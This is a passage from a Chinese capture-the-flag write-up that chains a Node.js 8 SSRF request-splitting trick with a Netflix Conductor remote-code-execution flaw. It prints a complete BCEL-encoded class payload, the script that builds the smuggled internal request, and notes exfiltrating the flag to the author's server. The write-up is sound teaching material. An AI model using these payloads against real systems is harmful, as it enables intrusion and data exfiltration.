+$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$e4$r$u$f8$C$5d$I$9a$d8$8d$3b$8c$h$a3$x$7cD$88$$$dcX$ea$E$87G$ne$m$f8E$ae$d9$a0q$e1$H$f8Q$ea$9d$c6$88$89N2$e7$ce$3d$f7$cc$b9$f3x$ffx$7d$Dp$80m$TQ$y$99$c8$o$X$c5$b2$8a$x$G$f2$s$c2$u$YX5$b0$c6$Q9$U$9e$90G$M$a1r$e5$9aA$3f$ee$dfs$86DMx$fc$7c$d4kr$bf$e14$bb$c4$c4$eb$d2q$3bg$ce$m$c8$83$ddy$92$f7$i$e11$e4$ca$b7$b5$b63v$ec$ae$e3$b5$ec$ba$f4$85$d7$aa$w$3b$b3$de$l$f9$$$3f$V$ca$ov2$W$dd$7d$a5$b3$Q$83i$60$dd$c2$G6$c9$7b$f8P$b4eo$60$fb$c2$ed$3cZ$u$a2$c4$90$99$h$9eL$5c$3e$90$a2$efY$d8$82I$5d$95$RCr$ae$b8h$b6$b9$x$ZRs$eaj$e4I$d1$a3$b6f$8b$cb$9f$q$5b$ae$d4$feh$aad$c9$t$dce$d8$v$ffs$8f_$d4$a5$dfw$f9pH$h$S$D$w$ca$e0Q$g$be$e3r$94$60$d0c$ab$a1$81$a9$fb$R$$PvG$b9F1$b7$fb$M$f6$C$z$j$9aA$bfyB$b4$b67CdJ$w$jq$q$e9O4X$a4$x$mB$Y$o6L$7c$8c$w$GR$e4$9c$r$c78U$92$d0$3e$J$98$81E$F$J$3d$d0$a4$be$bb$e5i25$a7$c1B$ZF$C$oN$98$O$O$97$f9$C$fe$5e$s$n$l$C$A$A
+```
+
+再次拼接然后拿到请求
+
+```
+post_payload = '[\u{017b}\u{0122}name\u{0122}:\u{0122}$\u{017b}\u{0127}1\u{0127}.getClass().forName(\u{0127}com.sun.org.apache.bcel.internal.util.ClassLoader\u{0127}).newInstance().loadClass(\u{0127}$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$e4$r$u$f8$C$5d$I$9a$d8$8d$3b$8c$h$a3$x$7cD$88$$$dcX$ea$E$87G$ne$m$f8E$ae$d9$a0q$e1$H$f8Q$ea$9d$c6$88$89N2$e7$ce$3d$f7$cc$b9$f3x$ffx$7d$Dp$80m$TQ$y$99$c8$o$X$c5$b2$8a$x$G$f2$s$c2$u$YX5$b0$c6$Q9$U$9e$90G$M$a1r$e5$9aA$3f$ee$dfs$86DMx$fc$7c$d4kr$bf$e14$bb$c4$c4$eb$d2q$3bg$ce$m$c8$83$ddy$92$f7$i$e11$e4$ca$b7$b5$b63v$ec$ae$e3$b5$ec$ba$f4$85$d7$aa$w$3b$b3$de$l$f9$$$3f$V$ca$ov2$W$dd$7d$a5$b3$Q$83i$60$dd$c2$G6$c9$7b$f8P$b4eo$60$fb$c2$ed$3cZ$u$a2$c4$90$99$h$9eL$5c$3e$90$a2$efY$d8$82I$5d$95$RCr$ae$b8h$b6$b9$x$ZRs$eaj$e4I$d1$a3$b6f$8b$cb$9f$q$5b$ae$d4$feh$aad$c9$t$dce$d8$v$ffs$8f_$d4$a5$dfw$f9pH$h$S$D$w$ca$e0Q$g$be$e3r$94$60$d0c$ab$a1$81$a9$fb$R$$PvG$b9F1$b7$fb$M$f6$C$z$j$9aA$bfyB$b4$b67CdJ$w$jq$q$e9O4X$a4$x$mB$Y$o6L$7c$8c$w$GR$e4$9c$r$c78U$92$d0$3e$J$98$81E$F$J$3d$d0$a4$be$bb$e5i25$a7$c1B$ZF$C$oN$98$O$O$97$f9$C$fe$5e$s$n$l$C$A$A\u{0127}).newInstance().class\u{017d}\u{0122},\u{0122}ownerEmail\u{0122}:\u{0122}test@example.org\u{0122},\u{0122}retryCount\u{0122}:\u{0122}3\u{0122},\u{0122}timeoutSeconds\u{0122}:\u{0122}1200\u{0122},\u{0122}inputKeys\u{0122}:[\u{0122}sourceRequestId\u{0122},\u{0122}qcElementType\u{0122}],\u{0122}outputKeys\u{0122}:[\u{0122}state\u{0122},\u{0122}skipped\u{0122},\u{0122}result\u{0122}],\u{0122}timeoutPolicy\u{0122}:\u{0122}TIME_OUT_WF\u{0122},\u{0122}retryLogic\u{0122}:\u{0122}FIXED\u{0122},\u{0122}retryDelaySeconds\u{0122}:\u{0122}600\u{0122},\u{0122}responseTimeoutSeconds\u{0122}:\u{0122}3600\u{0122},\u{0122}concurrentExecLimit\u{0122}:\u{0122}100\u{0122},\u{0122}rateLimitFrequencyInSeconds\u{0122}:\u{0122}60\u{0122},\u{0122}rateLimitPerFrequency\u{0122}:\u{0122}50\u{0122},\u{0122}isolationgroupId\u{0122}:\u{0122}myIsolationGroupId\u{0122}\u{017d}]'
+console.log(encodeURI(encodeURI(encodeURI('http://0.0.0.0:3000/\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}POST\u{0120}/search?url=http://10.0.140.9:8080/api/metadata/taskdefs\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}Content-Type:application/json\u{010D}\u{010A}Content-Length:' + post_payload.length + '\u{010D}\u{010A}\u{010D}\u{010A}' + post_payload+ '\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private'))))
+```
+
+得到请求
+
+```
+http://0.0.0.0:3000/%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0/search?url=http://10.0.140.9:8080/api/metadata/taskdefs%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application/json%2525C4%25258D%2525C4%25258AContent-Length:1426%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$e4$r$u$f8$C$5d$I$9a$d8$8d$3b$8c$h$a3$x$7cD$88$$$dcX$ea$E$87G$ne$m$f8E$ae$d9$a0q$e1$H$f8Q$ea$9d$c6$88$89N2$e7$ce$3d$f7$cc$b9$f3x$ffx$7d$Dp$80m$TQ$y$99$c8$o$X$c5$b2$8a$x$G$f2$s$c2$u$YX5$b0$c6$Q9$U$9e$90G$M$a1r$e5$9aA$3f$ee$dfs$86DMx$fc$7c$d4kr$bf$e14$bb$c4$c4$eb$d2q$3bg$ce$m$c8$83$ddy$92$f7$i$e11$e4$ca$b7$b5$b63v$ec$ae$e3$b5$ec$ba$f4$85$d7$aa$w$3b$b3$de$l$f9$$$3f$V$ca$ov2$W$dd$7d$a5$b3$Q$83i$60$dd$c2$G6$c9$7b$f8P$b4eo$60$fb$c2$ed$3cZ$u$a2$c4$90$99$h$9eL$5c$3e$90$a2$efY$d8$82I$5d$95$RCr$ae$b8h$b6$b9$x$ZRs$eaj$e4I$d1$a3$b6f$8b$cb$9f$q$5b$ae$d4$feh$aad$c9$t$dce$d8$v$ffs$8f_$d4$a5$dfw$f9pH$h$S$D$w$ca$e0Q$g$be$e3r$94$60$d0c$ab$a1$81$a9$fb$R$$PvG$b9F1$b7$fb$M$f6$C$z$j$9aA$bfyB$b4$b67CdJ$w$jq$q$e9O4X$a4$x$mB$Y$o6L$7c$8c$w$GR$e4$9c$r$c78U$92$d0$3e$J$98$81E$F$J$3d$d0$a4$be$bb$e5i25$a7$c1B$ZF$C$oN$98$O$O$97$f9$C$fe$5e$s$n$l$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0/private
+```
+
+通过 `/proxy?url=` 接上我们的请求然后去访问, 10001端口的web服务负责监听
+
+![20210706144832884](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210706144832884.png)
+
+得到加密的数据然后base64解密即可得到 flag
+
+![20210706144910460](D:\safetool\Tools\Web2\github\Rickyweb\Nepnep\Probation\img\20210706144910460.png)
+
+****
+
+### 总结
+
+- 利用 0.0.0.0，通过 `/proxy` 和 `/search` 接口绕 WAF，访问 `/flag` 拿 hint
+- 在 docker 内网段中扫 Netflix Conductor 服务
+
+- [Nodejs8 SSRF](http://www.iricky.ltd/2021/01/27/31.html#Nodejs8_SSRF)这个知识点考了几次, 就是高编码的绕过然后可以在 GET 传参下发送另一个请求
+- 找 Netflix Conductor 漏洞，利用一个 1day RCE 构造 payload
+- 利用 `/proxy` SSRF 给内网的 Netflix Conductor 执行远程命令，把 flag 打到自己的服务器上 
+- 再强调一点, javac 在linux和windows下编译出的效果是不一样的, 本文全程用windows进行java文件的编译
+
 ## [Insomni hack teaser 2019] Phuck2
 
 源码
